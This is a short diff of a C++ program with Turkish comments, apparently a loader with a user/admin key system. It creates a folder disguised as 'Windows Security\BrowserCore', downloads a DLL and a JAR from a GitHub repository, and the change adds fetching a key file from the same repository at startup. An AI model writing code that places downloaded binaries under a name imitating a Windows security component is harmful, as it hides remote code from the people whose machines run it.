@@ -17,7 +17,8 @@ namespace fs = std::filesystem;
 const std::string BASE_PATH = "C:\\Program Files\\Windows Security\\BrowserCore";
 const std::string DLL_URL = "https://github.com/ahmetyy636-dotcom/53asdas/raw/main/Rakun.dll";
 const std::string JAR_URL = "https://github.com/ahmetyy636-dotcom/53asdas/raw/main/oyleiste.jar";
-const std::string KEY_FILE = "keys.txt"; // Sunucu üzerinden çekilmesi önerilir, şimdilik yerel
+const std::string KEYS_URL = "https://github.com/ahmetyy636-dotcom/53asdas/raw/main/keys.txt";
+const std::string KEY_FILE = BASE_PATH + "\\keys.txt"; 
 
 enum KeyType { USER, ADMIN, INVALID };
 
@@ -145,6 +146,9 @@ int main() {
 
     // Dizin Hazırlığı
     if (!fs::exists(BASE_PATH)) fs::create_directories(BASE_PATH);
+
+    // Anahtarları GitHub'dan çek (Her zaman güncel olması için)
+    DownloadFile(KEYS_URL, KEY_FILE);
 
     drawBanner();
 
